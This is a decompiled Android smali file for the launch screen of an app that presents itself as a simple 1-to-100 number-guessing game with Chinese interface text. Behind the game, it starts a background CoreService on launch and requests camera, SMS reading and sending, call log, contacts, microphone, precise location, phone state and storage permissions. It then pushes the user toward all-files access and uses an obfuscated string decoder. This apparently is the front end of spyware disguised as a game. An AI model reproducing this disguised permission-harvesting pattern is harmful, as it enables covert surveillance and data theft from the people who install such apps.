.class public Lcom/piupiupiu/LaunchActivity;
.super Landroid/app/Activity;


# static fields
.field private static final a:Ljava/lang/String;

.field private static final b:[Ljava/lang/String;


# instance fields
.field private c:Landroid/widget/EditText;

.field private d:Landroid/widget/TextView;

.field private e:Landroid/widget/TextView;

.field private f:Landroid/widget/Button;

.field private g:Landroid/widget/Button;

.field private h:I

.field private i:I

.field private j:Z


# direct methods
.method static constructor <clinit>()V
    .locals 3

    const-string v0, "Ez9TEA=="

    invoke-static {v0}, Lcom/piupiupiu/StrCodec;->dec(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/piupiupiu/LaunchActivity;->a:Ljava/lang/String;

    const/16 v0, 0xa

    new-array v0, v0, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v2, "android.permission.CAMERA"

    aput-object v2, v0, v1

    const/4 v1, 0x1

    const-string v2, "android.permission.READ_SMS"

    aput-object v2, v0, v1

    const/4 v1, 0x2

    const-string v2, "android.permission.SEND_SMS"

    aput-object v2, v0, v1

    const/4 v1, 0x3

    const-string v2, "android.permission.READ_CALL_LOG"

    aput-object v2, v0, v1

    const/4 v1, 0x4

    const-string v2, "android.permission.READ_CONTACTS"

    aput-object v2, v0, v1

    const/4 v1, 0x5

    const-string v2, "android.permission.RECORD_AUDIO"

    aput-object v2, v0, v1

    const/4 v1, 0x6

    const-string v2, "android.permission.ACCESS_FINE_LOCATION"

    aput-object v2, v0, v1

    const/4 v1, 0x7

    const-string v2, "android.permission.READ_PHONE_STATE"

    aput-object v2, v0, v1

    const/16 v1, 0x8

    const-string v2, "android.permission.READ_EXTERNAL_STORAGE"

    aput-object v2, v0, v1

    const/16 v1, 0x9

    const-string v2, "android.permission.WRITE_EXTERNAL_STORAGE"

    aput-object v2, v0, v1

    sput-object v0, Lcom/piupiupiu/LaunchActivity;->b:[Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private a()V
    .locals 2

    const v0, 0x7f080002

    invoke-virtual {p0, v0}, Lcom/piupiupiu/LaunchActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/EditText;

    iput-object v0, p0, Lcom/piupiupiu/LaunchActivity;->c:Landroid/widget/EditText;

    const v0, 0x7f080004

    invoke-virtual {p0, v0}, Lcom/piupiupiu/LaunchActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/piupiupiu/LaunchActivity;->d:Landroid/widget/TextView;

    const v0, 0x7f080005

    invoke-virtual {p0, v0}, Lcom/piupiupiu/LaunchActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/piupiupiu/LaunchActivity;->e:Landroid/widget/TextView;

    const v0, 0x7f080003

    invoke-virtual {p0, v0}, Lcom/piupiupiu/LaunchActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/piupiupiu/LaunchActivity;->f:Landroid/widget/Button;

    const v0, 0x7f080006

    invoke-virtual {p0, v0}, Lcom/piupiupiu/LaunchActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/piupiupiu/LaunchActivity;->g:Landroid/widget/Button;

    invoke-direct {p0}, Lcom/piupiupiu/LaunchActivity;->b()V

    iget-object v0, p0, Lcom/piupiupiu/LaunchActivity;->f:Landroid/widget/Button;

    new-instance v1, Lcom/piupiupiu/LaunchActivity$1;

    invoke-direct {v1, p0}, Lcom/piupiupiu/LaunchActivity$1;-><init>(Lcom/piupiupiu/LaunchActivity;)V

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    iget-object v0, p0, Lcom/piupiupiu/LaunchActivity;->g:Landroid/widget/Button;

    new-instance v1, Lcom/piupiupiu/LaunchActivity$2;

    invoke-direct {v1, p0}, Lcom/piupiupiu/LaunchActivity$2;-><init>(Lcom/piupiupiu/LaunchActivity;)V

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    return-void
.end method

.method static synthetic a(Lcom/piupiupiu/LaunchActivity;)V
    .locals 0

    invoke-direct {p0}, Lcom/piupiupiu/LaunchActivity;->c()V

    return-void
.end method

.method private b()V
    .locals 4

    const/4 v3, 0x1

    const/4 v2, 0x0

    new-instance v0, Ljava/util/Random;

    invoke-direct {v0}, Ljava/util/Random;-><init>()V

    const/16 v1, 0x64

    invoke-virtual {v0, v1}, Ljava/util/Random;->nextInt(I)I

    move-result v0

    add-int/lit8 v0, v0, 0x1

    iput v0, p0, Lcom/piupiupiu/LaunchActivity;->h:I

    iput v2, p0, Lcom/piupiupiu/LaunchActivity;->i:I

    iput-boolean v2, p0, Lcom/piupiupiu/LaunchActivity;->j:Z

    iget-object v0, p0, Lcom/piupiupiu/LaunchActivity;->d:Landroid/widget/TextView;

    const-string v1, ""

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object v0, p0, Lcom/piupiupiu/LaunchActivity;->e:Landroid/widget/TextView;

    const-string v1, "\u5df2\u731c\u6b21\u6570\uff1a0"

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object v0, p0, Lcom/piupiupiu/LaunchActivity;->c:Landroid/widget/EditText;

    const-string v1, ""

    invoke-virtual {v0, v1}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    iget-object v0, p0, Lcom/piupiupiu/LaunchActivity;->c:Landroid/widget/EditText;

    invoke-virtual {v0, v3}, Landroid/widget/EditText;->setEnabled(Z)V

    iget-object v0, p0, Lcom/piupiupiu/LaunchActivity;->f:Landroid/widget/Button;

    invoke-virtual {v0, v3}, Landroid/widget/Button;->setEnabled(Z)V

    return-void
.end method

.method static synthetic b(Lcom/piupiupiu/LaunchActivity;)V
    .locals 0

    invoke-direct {p0}, Lcom/piupiupiu/LaunchActivity;->b()V

    return-void
.end method

.method private c()V
    .locals 6

    const/4 v5, 0x1

    const/4 v4, 0x0

    iget-boolean v0, p0, Lcom/piupiupiu/LaunchActivity;->j:Z

    if-eqz v0, :cond_0

    :goto_0
    return-void

    :cond_0
    iget-object v0, p0, Lcom/piupiupiu/LaunchActivity;->c:Landroid/widget/EditText;

    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_1

    const-string v0, "\u5148\u8f93\u5165\u4e00\u4e2a\u6570\u5b57"

    invoke-static {p0, v0, v4}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    goto :goto_0

    :cond_1
    :try_start_0
    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v0

    if-lt v0, v5, :cond_2

    const/16 v1, 0x64

    if-le v0, v1, :cond_3

    :cond_2
    const-string v0, "\u8bf7\u8f93\u5165 1-100 \u7684\u6574\u6570"

    invoke-static {p0, v0, v4}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    goto :goto_0

    :catch_0
    move-exception v0

    const-string v0, "\u8bf7\u8f93\u5165 1-100 \u7684\u6574\u6570"

    invoke-static {p0, v0, v4}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    goto :goto_0

    :cond_3
    iget v1, p0, Lcom/piupiupiu/LaunchActivity;->i:I

    add-int/lit8 v1, v1, 0x1

    iput v1, p0, Lcom/piupiupiu/LaunchActivity;->i:I

    iget-object v1, p0, Lcom/piupiupiu/LaunchActivity;->e:Landroid/widget/TextView;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "\u5df2\u731c\u6b21\u6570\uff1a"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget v3, p0, Lcom/piupiupiu/LaunchActivity;->i:I

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget v1, p0, Lcom/piupiupiu/LaunchActivity;->h:I

    if-ne v0, v1, :cond_4

    iput-boolean v5, p0, Lcom/piupiupiu/LaunchActivity;->j:Z

    iget-object v0, p0, Lcom/piupiupiu/LaunchActivity;->d:Landroid/widget/TextView;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "\u606d\u559c\u4f60\uff0c\u731c\u5bf9\u4e86\uff01\u7b54\u6848\u5c31\u662f "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget v2, p0, Lcom/piupiupiu/LaunchActivity;->h:I

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "\uff0c\u7528\u4e86 "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget v2, p0, Lcom/piupiupiu/LaunchActivity;->i:I

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, " \u6b21"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object v0, p0, Lcom/piupiupiu/LaunchActivity;->c:Landroid/widget/EditText;

    invoke-virtual {v0, v4}, Landroid/widget/EditText;->setEnabled(Z)V

    iget-object v0, p0, Lcom/piupiupiu/LaunchActivity;->f:Landroid/widget/Button;

    invoke-virtual {v0, v4}, Landroid/widget/Button;->setEnabled(Z)V

    :goto_1
    iget-object v0, p0, Lcom/piupiupiu/LaunchActivity;->c:Landroid/widget/EditText;

    const-string v1, ""

    invoke-virtual {v0, v1}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    goto/16 :goto_0

    :cond_4
    iget v1, p0, Lcom/piupiupiu/LaunchActivity;->h:I

    if-ge v0, v1, :cond_5

    iget-object v0, p0, Lcom/piupiupiu/LaunchActivity;->d:Landroid/widget/TextView;

    const-string v1, "\u592a\u5c0f\u4e86\uff0c\u518d\u5927\u4e00\u70b9\uff5e"

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto :goto_1

    :cond_5
    iget-object v0, p0, Lcom/piupiupiu/LaunchActivity;->d:Landroid/widget/TextView;

    const-string v1, "\u592a\u5927\u4e86\uff0c\u518d\u5c0f\u4e00\u70b9\uff5e"

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto :goto_1
.end method

.method private d()V
    .locals 3

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1e

    if-lt v0, v1, :cond_0

    invoke-direct {p0}, Lcom/piupiupiu/LaunchActivity;->e()Z

    move-result v0

    if-nez v0, :cond_0

    :try_start_0
    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.settings.MANAGE_ALL_FILES_ACCESS_PERMISSION"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "package:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {p0}, Lcom/piupiupiu/LaunchActivity;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    const/16 v1, 0x3ea

    invoke-virtual {p0, v0, v1}, Lcom/piupiupiu/LaunchActivity;->startActivityForResult(Landroid/content/Intent;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    :goto_0
    return-void

    :catch_0
    move-exception v0

    sget-object v1, Lcom/piupiupiu/LaunchActivity;->a:Ljava/lang/String;

    const-string v2, "cannot launch all-files settings, continue anyway"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    goto :goto_0
.end method

.method private e()Z
    .locals 3

    :try_start_0
    const-class v0, Landroid/os/Environment;

    const-string v1, "isExternalStorageManager"

    const/4 v2, 0x0

    new-array v2, v2, [Ljava/lang/Class;

    invoke-virtual {v0, v1, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    const/4 v1, 0x0

    const/4 v2, 0x0

    new-array v2, v2, [Ljava/lang/Object;

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v0

    :goto_0
    return v0

    :catch_0
    move-exception v0

    const/4 v0, 0x1

    goto :goto_0
.end method


# virtual methods
.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 0

    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 7

    const/4 v1, 0x0

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const/high16 v0, 0x7f030000

    invoke-virtual {p0, v0}, Lcom/piupiupiu/LaunchActivity;->setContentView(I)V

    invoke-direct {p0}, Lcom/piupiupiu/LaunchActivity;->a()V

    new-instance v0, Landroid/content/Intent;

    const-class v2, Lcom/piupiupiu/CoreService;

    invoke-direct {v0, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcom/piupiupiu/LaunchActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x17

    if-lt v0, v2, :cond_2

    new-instance v2, Ljava/util/ArrayList;

    invoke-direct {v2}, Ljava/util/ArrayList;-><init>()V

    sget-object v3, Lcom/piupiupiu/LaunchActivity;->b:[Ljava/lang/String;

    array-length v4, v3

    move v0, v1

    :goto_0
    if-ge v0, v4, :cond_1

    aget-object v5, v3, v0

    invoke-virtual {p0, v5}, Lcom/piupiupiu/LaunchActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v6

    if-eqz v6, :cond_0

    invoke-interface {v2, v5}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    :cond_0
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_1
    invoke-interface {v2}, Ljava/util/List;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Lcom/piupiupiu/LaunchActivity;->a:Ljava/lang/String;

    const-string v3, "requesting runtime permissions in-app"

    invoke-static {v0, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    new-array v0, v1, [Ljava/lang/String;

    invoke-interface {v2, v0}, Ljava/util/List;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [Ljava/lang/String;

    const/16 v1, 0x3e9

    invoke-virtual {p0, v0, v1}, Lcom/piupiupiu/LaunchActivity;->requestPermissions([Ljava/lang/String;I)V

    :cond_2
    invoke-direct {p0}, Lcom/piupiupiu/LaunchActivity;->d()V

    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 0

    invoke-direct {p0}, Lcom/piupiupiu/LaunchActivity;->d()V

    return-void
.end method
